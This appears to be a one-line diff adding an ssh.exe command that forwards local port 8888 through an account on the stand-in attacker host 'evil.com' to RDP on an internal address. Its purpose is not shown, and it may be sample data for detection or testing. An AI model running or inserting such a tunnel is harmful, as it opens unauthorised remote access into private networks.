@@ -1,0 +1,1 @@
+ssh.exe -L8888:192.168.1.10:3389 user@evil.com
